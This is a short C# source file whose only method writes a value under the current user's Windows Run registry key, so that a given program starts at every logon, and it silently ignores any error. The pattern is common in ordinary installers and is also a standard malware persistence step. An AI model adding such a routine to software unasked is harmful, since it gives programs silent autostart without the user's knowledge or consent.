using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Stt
{
    public class Main
    {
        public static void Startup(string keyName, string Path)
        {
            try
            {
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(keyName, Path);
            }
            catch { }
        } 
    }
}
